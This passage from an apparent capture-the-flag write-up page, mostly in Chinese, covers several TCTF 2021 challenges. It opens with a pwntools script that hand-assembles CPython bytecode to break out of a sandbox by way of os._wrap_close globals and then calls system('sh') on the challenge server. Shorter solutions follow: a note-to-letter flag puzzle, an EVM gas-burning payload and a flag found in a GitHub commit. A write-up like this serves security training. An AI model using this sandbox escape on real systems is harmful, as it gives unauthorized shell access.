        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BUILD_SLICE&quot;</span>], <span class="hljs-number">2</span>]) + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_SUBSCR&quot;</span>], <span class="hljs-number">0</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_helper1</span>():</span>
    <span class="hljs-comment"># __base__, __subclassess__, __init__, __getattribute__</span>
    hint = <span class="hljs-string">&#x27;&#x27;</span>.__class__.__class__.__dict__
    code = \
        gen_empty_str() + \
        get_class() + \
        get_class() + \
        get_dict()
    <span class="hljs-keyword">return</span> hint, code

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_helper2</span>(<span class="hljs-params">ini = <span class="hljs-literal">None</span></span>):</span>
    <span class="hljs-comment"># __globals__</span>
    hint = os._wrap_close.__init__.__class__.__dict__
    code = \
        <span class="hljs-string">b&quot;&quot;</span> + \
        get_class() + \
        get_dict()
    <span class="hljs-keyword">return</span> hint, code

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_helper3</span>(<span class="hljs-params">glb = <span class="hljs-literal">None</span></span>):</span>
    <span class="hljs-comment"># system, sh</span>
    hint = os._wrap_close.__init__.__globals__
    code = <span class="hljs-string">b&quot;&quot;</span>
    <span class="hljs-keyword">return</span> hint, code

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call_method</span>(<span class="hljs-params">x</span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;CALL_METHOD&quot;</span>], x])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call_function</span>(<span class="hljs-params">x</span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>], x])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save_var</span>(<span class="hljs-params">x = <span class="hljs-number">1</span></span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;STORE_NAME&quot;</span>], x])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_var</span>(<span class="hljs-params">x = <span class="hljs-number">1</span></span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;LOAD_NAME&quot;</span>], x])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">binary_subscr</span>():</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_SUBSCR&quot;</span>], <span class="hljs-number">0</span>])


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_char</span>(<span class="hljs-params">c</span>):</span>
    s = <span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-string">&#x27;&#x27;</span>.__class__.__dict__}</span>&quot;</span>
    <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s:
        <span class="hljs-keyword">raise</span> ValueError()
    idx = s.index(c)
    <span class="hljs-keyword">return</span> \
        gen_empty_str() + \
        get_class() + \
        get_dict() + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;FORMAT_VALUE&quot;</span>], <span class="hljs-number">1</span>]) + \
        gen_int(idx) + \
        <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_SUBSCR&quot;</span>], <span class="hljs-number">0</span>])


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_string_old</span>(<span class="hljs-params">s:<span class="hljs-built_in">str</span></span>):</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(s) == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">return</span> gen_empty_str()
    ans = gen_char(s[<span class="hljs-number">0</span>])
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> s[<span class="hljs-number">1</span>:]:
        ans += gen_char(x)
        ans += <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_ADD&quot;</span>], <span class="hljs-number">0</span>])
    <span class="hljs-keyword">return</span> ans


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_code</span>():</span>
    code = <span class="hljs-string">b&quot;&quot;</span>

    <span class="hljs-comment"># &lt;class &#x27;object&#x27;&gt;</span>
    code += gen_empty_str()
    code += get_class()
    code += get_class()
    code += get_dict()
    code += gen_string(str_helper1, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>)
    code += binary_subscr()
    code += gen_empty_str()
    code += get_class()
    code += gen_string(str_helper1, <span class="hljs-string">&#x27;__base__&#x27;</span>)
    code += call_function(<span class="hljs-number">2</span>)

    <span class="hljs-comment"># object.__subclassess__()</span>
    code += save_var(<span class="hljs-number">1</span>)
    code += load_var(<span class="hljs-number">1</span>)
    code += get_dict()
    code += gen_string(str_helper1, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>)
    code += binary_subscr()
    code += load_var(<span class="hljs-number">1</span>)
    code += gen_string(str_helper1, <span class="hljs-string">&#x27;__subclasses__&#x27;</span>)
    code += call_function(<span class="hljs-number">2</span>)
    code += call_function(<span class="hljs-number">0</span>)

    <span class="hljs-comment"># save subclasses</span>
    code += save_var(<span class="hljs-number">0</span>)

    <span class="hljs-string">&quot;&quot;&quot;
    # exception
    code += bytes([opmap[&quot;BUILD_MAP&quot;], 0])
    code += load_var(0)
    code += bytes([opmap[&quot;FORMAT_VALUE&quot;], 1])
    code += binary_subscr()
    &quot;&quot;&quot;</span>

    <span class="hljs-comment"># &lt;class &#x27;os._wrap_close&#x27;&gt;</span>
    code += load_var(<span class="hljs-number">0</span>)
    code += gen_int(<span class="hljs-number">133</span>) <span class="hljs-comment"># 133</span>
    code += binary_subscr()

    <span class="hljs-comment"># _wrap_close.__init__</span>
    code += save_var(<span class="hljs-number">1</span>)
    code += load_var(<span class="hljs-number">1</span>)
    code += get_class()
    code += get_dict()
    code += gen_string(str_helper1, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>)
    code += binary_subscr()
    code += load_var(<span class="hljs-number">1</span>)
    code += gen_string(str_helper1, <span class="hljs-string">&#x27;__init__&#x27;</span>)
    code += call_function(<span class="hljs-number">2</span>)

    <span class="hljs-comment"># __globals__</span>
    code += save_var(<span class="hljs-number">1</span>) <span class="hljs-comment"># save init</span>
    code += load_var(<span class="hljs-number">0</span>) <span class="hljs-comment"># load attrgetter</span>
    code += gen_int(<span class="hljs-number">148</span>) <span class="hljs-comment"># 168</span>
    code += binary_subscr() <span class="hljs-comment"># attrgetter</span>
    code += load_var(<span class="hljs-number">1</span>) <span class="hljs-comment"># load init</span>
    code += gen_string(str_helper2, <span class="hljs-string">&#x27;__globals__&#x27;</span>)
    code += call_function(<span class="hljs-number">1</span>)
    code += load_var(<span class="hljs-number">1</span>) <span class="hljs-comment"># load init</span>
    code += call_function(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># globals[&quot;system&quot;](&quot;sh&quot;)</span>
    code += save_var(<span class="hljs-number">1</span>)
    code += load_var(<span class="hljs-number">1</span>)
    code += load_var(<span class="hljs-number">1</span>)
    code += gen_string(str_helper3, <span class="hljs-string">&quot;system&quot;</span>)
    code += <span class="hljs-built_in">bytes</span>([opmap[<span class="hljs-string">&quot;BINARY_SUBSCR&quot;</span>], <span class="hljs-number">0</span>])

    <span class="hljs-comment">#code += load_var(1)</span>
    code += gen_string_old(<span class="hljs-string">&quot;sh&quot;</span>)

    code += call_function(<span class="hljs-number">1</span>)

    code += gen_return()
    <span class="hljs-comment">#print(&#x27;&#x27;.join(&quot;%02x&quot; % x for x in code))</span>
    <span class="hljs-comment">#dis.dis(code)</span>
    <span class="hljs-comment">#print(len(code))</span>
    <span class="hljs-comment">#print()</span>
    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(code) &lt;= <span class="hljs-number">2000</span>
    hex_code = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;%02x&#x27;</span> % x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> code)
    <span class="hljs-keyword">return</span> hex_code

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.log_level = <span class="hljs-string">&quot;debug&quot;</span>

code = get_code()
r = remote(<span class="hljs-string">&quot;111.186.58.164&quot;</span>, <span class="hljs-number">13337</span>)
r.recvuntil(<span class="hljs-string">&quot;in hex&quot;</span>, timeout=<span class="hljs-number">1</span>)
r.recvuntil(<span class="hljs-string">&quot;in hex&quot;</span>, timeout=<span class="hljs-number">1</span>)
r.sendline(code)
r.recvuntil(<span class="hljs-string">&quot;gift1&quot;</span>, timeout=<span class="hljs-number">1</span>)
r.sendline(<span class="hljs-string">&quot;class&quot;</span>)
r.recvuntil(<span class="hljs-string">&quot;gift2&quot;</span>, timeout=<span class="hljs-number">1</span>)
r.sendline(<span class="hljs-string">&quot;dict&quot;</span>)
r.interactive()</code></pre><h3 id="singer"><a class="header-link" href="#singer"></a>Singer</h3>
<p>题目的附件</p>
<pre class="hljs"><code><span class="hljs-built_in">A6</span>-D<span class="hljs-comment">#6</span>
G<span class="hljs-comment">#6</span>
G6
G6
G<span class="hljs-comment">#6</span>
<span class="hljs-built_in">A6</span>-D<span class="hljs-comment">#6</span>

C6-G5
F<span class="hljs-comment">#5</span>
F<span class="hljs-comment">#5</span>
C6-G5

<span class="hljs-built_in">A6</span>-F<span class="hljs-comment">#6,D#6</span>
<span class="hljs-built_in">A6</span>,F<span class="hljs-comment">#6,D#6</span>
<span class="hljs-built_in">A6</span>,F<span class="hljs-comment">#6-D#6</span>

<span class="hljs-built_in">A6</span>,D<span class="hljs-comment">#6</span>
<span class="hljs-built_in">A6</span>-D<span class="hljs-comment">#6</span>
<span class="hljs-built_in">A6</span>,D<span class="hljs-comment">#6</span>

F<span class="hljs-comment">#7-C7</span>
E7-D7
F7,C<span class="hljs-comment">#7</span>
F<span class="hljs-comment">#7,C7</span>

E6,A<span class="hljs-comment">#5</span>
E6-A<span class="hljs-comment">#5</span>
E6,A<span class="hljs-comment">#5</span>

<span class="hljs-built_in">A6</span>-D<span class="hljs-comment">#6</span>
<span class="hljs-built_in">A6</span>-G6
F<span class="hljs-comment">#6-E6</span>
<span class="hljs-built_in">A6</span>-D<span class="hljs-comment">#6</span></code></pre><p>这里我们用FL Stdio进行一下模拟</p>
<p>文本出现的内容的数据范围都在C5——C7之间</p>
<p class="img-container"><img src="./pngs/fl1.png" alt="img"></p>
<p>然后根据其对应的情况进行绘图</p>
<p>其中&#39;-&#39;代表一个范围的数据 而&#39;,&#39;代码在同一列的位置</p>
<p>这里从第一段数据入手</p>
<pre class="hljs"><code>A<span class="hljs-number">6</span>-D<span class="hljs-attr">#6</span>
G<span class="hljs-attr">#6</span>
<span class="hljs-name">G6</span>
<span class="hljs-name">G6</span>
G<span class="hljs-attr">#6</span>
A<span class="hljs-number">6</span>-D<span class="hljs-attr">#6</span></code></pre><p>一行数据可以画为一列</p>
<p class="img-container"><img src="./pngs/fl2.png" alt="img"></p>
<p>这样就画出的大写的M</p>
<p>通过第三组数据:</p>
<pre class="hljs"><code><span class="hljs-attribute">A6</span>-F#<span class="hljs-number">6</span>,D#<span class="hljs-number">6</span>
<span class="hljs-attribute">A6</span>,F#<span class="hljs-number">6</span>,D#<span class="hljs-number">6</span>
<span class="hljs-attribute">A6</span>,F#<span class="hljs-number">6</span>-D#<span class="hljs-number">6</span></code></pre><p>依次进行对应的绘图操作 </p>
<p class="img-container"><img src="./pngs/fl3.png" alt="img"></p>
<p>即可得到大写的S</p>
<p>根据组的顺序进行绘图</p>
<p>即可得到</p>
<p class="img-container"><img src="./pngs/fl4.png" alt="img"></p>
<p>得到:MUSIKING</p>
<p>同时题目要求flag为小写字母,将其转为小写 最后的flag为flag{musiking}</p>
<blockquote>
<p>special format: flag{[a-z]*}</p>
</blockquote>
<h3 id="gas-machine"><a class="header-link" href="#gas-machine"></a>gas machine</h3>
<p>将gas通过构造的指令消耗完即可，runtime bytecode长度只要小于100即可</p>
<pre class="hljs"><code><span class="hljs-comment"># 0x00</span>
s = <span class="hljs-string">&#x27;5b&#x27;</span>         <span class="hljs-comment"># jumpdest                    1</span>
s += <span class="hljs-string">&#x27;6050&#x27;</span>       <span class="hljs-comment"># push1 0x50     3</span>
s += <span class="hljs-string">&#x27;5a&#x27;</span>         <span class="hljs-comment"># gas            2</span>
s += <span class="hljs-string">&#x27;11&#x27;</span>         <span class="hljs-comment"># GT             3</span>
s += <span class="hljs-string">&#x27;6000&#x27;</span>       <span class="hljs-comment"># push1 0x00     3</span>
s += <span class="hljs-string">&#x27;57&#x27;</span>         <span class="hljs-comment"># jumpi         10</span>

<span class="hljs-comment"># 0x08</span>
s += <span class="hljs-string">&#x27;5a&#x27;</span>         <span class="hljs-comment"># gas                   2</span>
s += <span class="hljs-string">&#x27;606b&#x27;</span>       <span class="hljs-comment"># push1 0x6b            3</span>
s += <span class="hljs-string">&#x27;03&#x27;</span>         <span class="hljs-comment"># sub                   3</span>
s += <span class="hljs-string">&#x27;56&#x27;</span>         <span class="hljs-comment"># jump                  8</span>
s += <span class="hljs-string">&#x27;5b&#x27;</span>*<span class="hljs-number">0x50</span>    <span class="hljs-comment"># jumpdest*50          1</span>
s += <span class="hljs-string">&#x27;00&#x27;</span>         <span class="hljs-comment"># stop</span>

<span class="hljs-built_in">print</span>(s)

<span class="hljs-comment"># 107 - 30 = 77</span>
<span class="hljs-comment"># 93 - 16 = 77</span></code></pre><p class="img-container"><img src="./pngs/gas_exp.png" alt="img"></p>
<h3 id="guthib"><a class="header-link" href="#guthib"></a>GutHib</h3>
<p>通过 <a href="https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/events">https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/events</a> 拿到commit id</p>
<p>然后直球访问 <a href="https://github.com/awesome-ctf/TCTF2021-Guthib/tree/da883505ed6754f328296cac1ddb203593473967">https://github.com/awesome-ctf/TCTF2021-Guthib/tree/da883505ed6754f328296cac1ddb203593473967</a> 即可看到flag</p>
        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
